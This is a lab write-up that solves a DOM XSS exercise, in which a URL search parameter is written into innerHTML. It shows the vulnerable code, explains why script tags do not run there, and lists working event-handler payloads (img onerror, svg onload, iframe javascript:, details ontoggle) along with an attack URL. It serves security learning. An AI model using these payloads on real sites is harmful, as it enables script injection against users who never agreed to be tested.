# DOM XSS in innerHTML sink using source location.search — Apprentice

**Status:** Solved

---

## Goal

Exploit DOM XSS where user input from URL is placed into `innerHTML` property, which doesnt execute `<script>` tags but allows other event handlers.

---

## Steps (simple & complete)

1. **Find the vulnerable feature**
   - Go to homepage
   - Use search functionality
   - Search term appears in the page

2. **Check the JavaScript**
   - View page source
   - Find code using `innerHTML`:
```javascript
   var search = new URLSearchParams(window.location.search).get('search');
   document.getElementById('searchMessage').innerHTML = search;
```

3. **Understand innerHTML limitation**
   - `innerHTML` doesnt execute `<script>` tags
   - But it executes event handlers like `onerror`, `onload`
   - We need alternative XSS vector!

4. **Use img tag with onerror**
   - Payload:
```
   <img src=x onerror=alert(1)>
```
   - `src=x` is invalid image
   - Browser triggers `onerror` event
   - Our `alert(1)` executes!

5. **Execute the attack**
```
   https://TARGET/?search=<img src=x onerror=alert(1)>
```

6. **Verify alert appears**
   - Lab solves automatically

---

## Example

**Normal search:**
```
URL: /?search=test
innerHTML: test
```

**XSS payload:**
```
URL: /?search=<img src=x onerror=alert(1)>
innerHTML: <img src=x onerror=alert(1)>
Result: Image fails to load → onerror fires → alert! ✓
```

---

## Alternative payloads for innerHTML

**Body tag:**
```html
<body onload=alert(1)>
```

**SVG:**
```html
<svg onload=alert(1)>
```

**Iframe:**
```html
<iframe src=javascript:alert(1)>
```

**Details tag:**
```html
<details open ontoggle=alert(1)>
```

---

## Why script tags dont work
```javascript
element.innerHTML = '<script>alert(1)</script>';
// Script tag gets inserted but DOESN'T execute!
```

Browser security: `innerHTML` parses HTML but doesnt execute scripts for safety.

Solution: Use event handlers that execute JavaScript!

---

